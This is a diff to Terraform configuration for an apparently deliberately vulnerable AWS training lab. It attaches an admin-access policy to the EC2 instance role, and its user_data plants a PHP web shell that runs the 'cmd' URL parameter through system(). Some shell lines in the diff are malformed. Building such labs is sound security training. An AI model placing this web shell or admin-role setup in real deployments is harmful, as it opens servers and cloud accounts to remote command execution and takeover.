@@ -1,6 +1,6 @@
 #IAM Role
-resource "aws_iam_role" "RCE-Privesc-Role" {
-  name = "RCE-Privesc-Role-${var.cgid}"
+resource "aws_iam_role" "aws_admin_role" {
+  name = "aws_admin_role"
   assume_role_policy = <<EOF
 {
   "Version": "2012-10-17",
@@ -20,14 +20,14 @@ EOF
 
 #IAM Role Policy Attachment
 resource "aws_iam_role_policy_attachment" "RCE-Privesc-Role-policy-attachment-s3" {
-  role = "${aws_iam_role.RCE-Privesc-Role.name}"
-  policy_arn = "${data.aws_iam_policy.s3-full-access.arn}"
+  role = "${aws_iam_role.aws_admin_role.name}"
+  policy_arn = "${data.aws_iam_policy.aws-admin-access.arn}"
 }
 
 #IAM Instance Profile
 resource "aws_iam_instance_profile" "cg-ec2-instance-profile" {
   name = "cg-ec2-instance-profile-${var.cgid}"
-  role = "${aws_iam_role.RCE-Privesc-Role.name}"
+  role = "${aws_iam_role.aws_admin_role.name}"
 }
 
 #Security Groups
@@ -43,6 +43,13 @@ resource "aws_security_group" "cg-ec2-ssh-security-group" {
     cidr_blocks = ["0.0.0.0/0"]
   }
 
+   ingress {
+   from_port =80
+   to_port =80
+   protocol	="tcp"
+	cidr_blocks=["127.0.0.1/32"]
+ }
+
   egress {
     from_port = 0
     to_port = 0
@@ -57,33 +64,12 @@ resource "aws_security_group" "cg-ec2-ssh-security-group" {
    }
 }
 
-resource "aws_security_group" "cg-ec2-http-security-group" {
- name ="cg-ec2-http-${var.cgid}"
- description = "CloudGoat ${var.cgid} Security Group for EC2 Instance over HTTP"
- vpc_id ="${aws_vpc.cg-vpc.id}"
-
- ingress {
-   from_port =80
-   to_port =80
-   protocol	="tcp"
-	cidr_blocks=["127.0.0.1/32"]
- }
-
-  egress {
-      from_port = 0
-      to_port = 0
-      protocol = "-1"
-      cidr_blocks = [
-          "0.0.0.0/0"
-      ]
-  }
-}
-
 #AWS Key Pair
 resource "aws_key_pair" "cg-ec2-key-pair" {
   key_name = "cg-ec2-key-pair-${var.cgid}"
   public_key = "${file(var.ssh-public-key-for-ec2)}"
 }
+
 #EC2 Instance
 resource "aws_instance" "ec2-vulnerable-proxy-server" {
     ami = "ami-0a313d6098716f372"
@@ -93,7 +79,7 @@ resource "aws_instance" "ec2-vulnerable-proxy-server" {
     associate_public_ip_address = true
     vpc_security_group_ids = [
         "${aws_security_group.cg-ec2-ssh-security-group.id}",
-        "${aws_security_group.cg-ec2-http-security-group.id}"
+#        "${aws_security_group.cg-ec2-http-security-group.id}"
     ]
     key_name = "${aws_key_pair.cg-ec2-key-pair.key_name}"
     root_block_device {
@@ -104,14 +90,18 @@ resource "aws_instance" "ec2-vulnerable-proxy-server" {
     user_data = <<-EOF
     #!/bin/bash
 
-    echo '<?php' > /var/www/html/index.php
+    sudo apt-get update -y && sudo apt-get upgrade -y
+    sudo apt-get install apache2 php libapache2-mod-php -y
+    sudo rm -rf /var/www/html/index.html
+    echo -e '<html>\n<h1>This is RCE Page</h1>\n<br>' >> /var/www/html/index.php
+    echo '<h3>You can use "cmd" parameter on url <br>Good Luck!</h3>' >> /var/www/html/index.php
+    echo '<?php' >> /var/www/html/index.php
     echo 'if(isset($_GET["cmd"])) {' >> /var/www/html/index.php
     echo 'system($_GET["cmd"]);' >> /var/www/html/index.php
-    echo '}' >> /var/www/html/index.php
-    echo '?>' >> /var/www/html/index.php
-
-    systemctl restart apache2.service
+    echo -e '}\n?>\n</html>' >> /var/www/html/index.php
+    systemctl start apache2.service systemctl enable apache-service.service
   EOF
+
     tags = {
         Name = "RCE_Privesc_web"
         Description = "Web Application"
